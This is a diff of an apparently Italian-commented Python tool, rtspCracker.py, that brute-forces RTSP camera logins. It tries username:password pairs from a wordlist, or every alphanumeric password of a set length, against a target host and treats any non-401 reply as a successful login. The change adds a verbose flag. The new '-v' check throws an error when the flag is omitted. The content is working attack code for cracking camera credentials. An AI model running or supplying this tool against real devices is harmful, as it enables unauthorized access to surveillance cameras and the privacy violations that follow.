@@ -12,7 +12,7 @@ import string
 #si crittano le credenziali in base64 per non lasciarle in chiaro durante lo scambio di messaggi -_-
 #insomma facili da rubare
 
-def rtspBruteForceDictionary(host, port, credentials):
+def rtspBruteForceDictionary(host, port, credentials, verbose):
     #apro il file delle credenziali in lettura
     with open(credentials, "r") as credList:
         
@@ -21,7 +21,6 @@ def rtspBruteForceDictionary(host, port, credentials):
             
             #leggo le credenziali dal file formato username:password e le critto in base64
             userPasswd = b64encode(line.strip().encode()).decode()
-            print("userpasswd # "+line.strip())
             rtspMessage = (
                 f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\n"
                 f"CSeq: 1\r\n"
@@ -33,22 +32,25 @@ def rtspBruteForceDictionary(host, port, credentials):
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                     s.settimeout(3)  # Timeout breve per velocizzare
                     s.connect((host, port))
-                    print("Connesso, provo le credenziali")
                     s.send(rtspMessage.encode())
                     response = s.recv(1024).decode()
                     
                     # Se la risposta non contiene "401 Unauthorized", è un successo
                     if "401 Unauthorized" not in response:
-                        print(f"Accesso riuscito: {username}:{password} su {host}:{port}")
-                        return (host, username, password)
+                        if verbose:
+                            print(f"Accesso riuscito: {username}:{password} su {host}:{port}")
+                        else:
+                            print(f"{username}:{password}")
+                        return True
             except socket.error as e:
-                print(f"Errore di connessione su {host}:{port} - {e}")
+                if verbose:
+                    print(f"Errore di connessione su {host}:{port} - {e}")
                 continue
-    return None
+    return False
 
 
 
-def rtspBruteForce(host, port, username, passwordLength):
+def rtspBruteForce(host, port, username, passwordLength, verbose):
 
     #indica che la combinazione deve essere di lettere maiuscole/minuscole e numeri
     chars = string.ascii_letters + string.digits
@@ -71,19 +73,22 @@ def rtspBruteForce(host, port, username, passwordLength):
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(3)  # Timeout breve per velocizzare
                 s.connect((host, port))
-                print("Connesso, provo le credenziali")
                 s.send(rtspMessage.encode())
                 response = s.recv(1024).decode()
                     
                 # Se la risposta non contiene "401 Unauthorized", è un successo
                 if "401 Unauthorized" not in response:
-                    print(f"Accesso riuscito: {username}:{password} su {host}:{port}")
-                    return (host, username, password)
+                    if verbose:
+                        print(f"Accesso riuscito: {username}:{password} su {host}:{port}")
+                    else:
+                        print(f"{username}:{password}")
+                    return True
         except socket.error as e:
-            print(f"Errore di connessione su {host}:{port} - {e}")
+            if verbose:
+                print(f"Errore di connessione su {host}:{port} - {e}")
             continue
 
-    return None
+    return False
 
 
 # Esegui brute-force su host e porta specifici
@@ -92,31 +97,43 @@ def main():
     # Configura gli IP e le porte RTSP che vuoi testare
     ip = sys.argv[1]  # Usa il range della tua rete
     rtspPort = int(sys.argv[2])
+    index = sys.argv.index("-v")
 
-    print("target ip # "+ip)
-    print("rtsp port # "+str(rtspPort))
+    if index >= 0:
+        verbose = True
+    else:
+        verbose = False
+
+
+    if verbose:
+        print("target ip # "+ip)
+        print("rtsp port # "+str(rtspPort))
 
     if sys.argv[3] == "--bruteforce":
         
         username = sys.argv[4]
         passwordLength = int(sys.argv[5])
+        if verbose:
+            print("username # "+username)
+            print("lunghezza della password # "+str(passwordLength))
 
-        print("username # "+username)
-        print("lunghezza della password # "+str(passwordLength))
-
-        rtspBruteForce(ip, rtspPort, username, passwordLength)
+        if not rtspBruteForce(ip, rtspPort, username, passwordLength, verbose):
+            print("Accesso non riuscito")
 
     else:
         
         credentialList = sys.argv[3]
-        print("credential list file # "+credentialList)
-        rtspBruteForceDictionary(ip, rtspPort, credentialList)
+        if verbose:
+            print("credential list file # "+credentialList)
+
+        if not rtspBruteForceDictionary(ip, rtspPort, credentialList, verbose):
+            print("Accesso non riuscito")
     
 
 def help():
-    print("rtspCracker.py <ip> <rtsp port> <credentials list file>")
+    print("rtspCracker.py <ip> <rtsp port> <credentials list file> -v")
     print("or")
-    print("rtspCracker.py <ip> <rtsp port> --bruteforce <username> <password length>")
+    print("rtspCracker.py <ip> <rtsp port> --bruteforce <username> <password length> -v")
 
 if __name__ == "__main__":
     if len(sys.argv) > 1:
